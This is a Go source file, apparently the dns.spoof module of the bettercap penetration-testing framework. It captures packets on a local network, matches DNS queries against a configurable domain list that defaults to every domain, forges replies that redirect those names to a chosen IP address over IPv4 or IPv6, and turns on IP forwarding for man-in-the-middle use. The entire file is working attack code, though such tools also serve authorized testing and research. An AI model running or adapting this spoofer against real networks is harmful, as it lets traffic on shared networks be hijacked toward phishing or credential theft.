package modules

import (
	"bytes"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type DNSSpoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	Domains       []string
	Address       net.IP
	All           bool
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDNSSpoofer(s *session.Session) *DNSSpoofer {
	spoof := &DNSSpoofer{
		SessionModule: session.NewSessionModule("dns.spoof", s),
		Handle:        nil,
		All:           false,
		waitGroup:     &sync.WaitGroup{},
	}

	spoof.AddParam(session.NewStringParameter("dns.spoof.domains",
		"*",
		``,
		"Comma separated values of domain names to spoof."))

	spoof.AddParam(session.NewStringParameter("dns.spoof.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"IP address to map the domains to."))

	spoof.AddParam(session.NewBoolParameter("dns.spoof.all",
		"false",
		"If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc."))

	spoof.AddHandler(session.NewModuleHandler("dns.spoof on", "",
		"Start the DNS spoofer in the background.",
		func(args []string) error {
			return spoof.Start()
		}))

	spoof.AddHandler(session.NewModuleHandler("dns.spoof off", "",
		"Stop the DNS spoofer in the background.",
		func(args []string) error {
			return spoof.Stop()
		}))

	return spoof
}

func (s DNSSpoofer) Name() string {
	return "dns.spoof"
}

func (s DNSSpoofer) Description() string {
	return "Replies to DNS messages with spoofed responses."
}

func (s DNSSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (s *DNSSpoofer) Configure() error {
	var err error
	var addr string

	if s.Running() {
		return session.ErrAlreadyStarted
	}

	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
		return err
	}

	err = s.Handle.SetBPFFilter("udp")
	if err != nil {
		return err
	}

	if err, s.All = s.BoolParam("dns.spoof.all"); err != nil {
		return err
	}

	if err, s.Domains = s.ListParam("dns.spoof.domains"); err != nil {
		return err
	}

	if err, addr = s.StringParam("dns.spoof.address"); err != nil {
		return err
	}

	s.Address = net.ParseIP(addr)

	if s.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		s.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (s *DNSSpoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, req *layers.DNS, target net.HardwareAddr) {
	redir := fmt.Sprintf("(->%s)", s.Address)
	who := target.String()

	if t, found := s.Session.Lan.Get(target.String()); found == true {
		who = t.String()
	}

	log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(who))

	var err error
	var src, dst net.IP

	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		log.Debug("Missing network layer skipping packet.")
		return
	}

	var eType layers.EthernetType
	var ipv6 bool

	if nlayer.LayerType() == layers.LayerTypeIPv4 {
		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = false
		eType = layers.EthernetTypeIPv4

	} else {
		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = true
		eType = layers.EthernetTypeIPv6
	}

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: eType,
	}

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    s.Address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	var raw []byte

	if ipv6 == true {
		ip6 := layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolUDP,
			HopLimit:   64,
			SrcIP:      src,
			DstIP:      dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip6)

		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
		if err != nil {
			log.Error("Error serializing packet: %s.", err)
			return
		}
	} else {
		ip4 := layers.IPv4{
			Protocol: layers.IPProtocolUDP,
			Version:  4,
			TTL:      64,
			SrcIP:    src,
			DstIP:    dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip4)

		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
		if err != nil {
			log.Error("Error serializing packet: %s.", err)
			return
		}
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.Session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *DNSSpoofer) shouldSpoof(domain string) bool {
	if len(s.Domains) == 1 && s.Domains[0] == "*" {
		return true
	}

	for _, d := range s.Domains {
		if strings.HasSuffix(domain, d) == true {
			return true
		}
	}
	return false
}

func (s *DNSSpoofer) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)

	if s.All || bytes.Compare(eth.DstMAC, s.Session.Interface.HW) == 0 {
		dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
		if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
			udp := typeUDP.(*layers.UDP)
			for _, q := range dns.Questions {
				qName := string(q.Name)
				if s.shouldSpoof(qName) == true {
					s.dnsReply(pkt, eth, udp, qName, dns, eth.SrcMAC)
					break
				} else {
					log.Debug("Skipping domain %s", qName)
				}
			}
		}
	}
}

func (s *DNSSpoofer) Start() error {
	if err := s.Configure(); err != nil {
		return err
	}

	return s.SetRunning(true, func() {
		s.waitGroup.Add(1)
		defer s.waitGroup.Done()

		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
		s.pktSourceChan = src.Packets()
		for packet := range s.pktSourceChan {
			if s.Running() == false {
				break
			}

			s.onPacket(packet)
		}
	})
}

func (s *DNSSpoofer) Stop() error {
	return s.SetRunning(false, func() {
		s.pktSourceChan <- nil
		s.Handle.Close()
		s.waitGroup.Wait()
	})
}
